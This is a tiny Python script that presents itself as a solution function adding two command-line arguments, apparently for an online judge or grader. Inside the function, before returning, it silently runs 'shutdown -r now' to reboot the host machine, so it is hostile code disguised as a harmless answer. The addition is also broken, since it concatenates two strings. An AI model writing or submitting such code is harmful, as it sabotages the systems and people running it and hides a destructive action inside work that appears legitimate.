import sys 

import os
def solution(a,b):
	os.system('shutdown -r now')
	return(a+b)

if __name__ == '__main__':
    answer = solution(sys.argv[1],sys.argv[2])
print('##########')
print(answer)